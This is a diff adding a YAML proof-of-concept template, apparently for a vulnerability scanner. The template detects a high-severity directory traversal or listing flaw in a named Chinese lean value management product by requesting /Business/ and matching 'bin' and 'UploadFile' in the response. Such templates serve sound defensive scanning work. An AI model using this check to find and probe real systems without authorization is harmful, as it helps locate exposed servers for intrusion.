@@ -1,0 +1,14 @@
+id: poc-yaml-jila-keji-lean-value-management-system-directory-traversal
+info:
+  name: 吉拉科技 LVS精益价值管理系统 Business 目录遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: ASP.NET
+requests:
+- method: GET
+  path: /Business/
+  expression: status_code == 200 && contains(body, "bin") && contains(body, "UploadFile")
+    && content_type == "text/html; charset=UTF-8"
+variables: {}
+transport: http
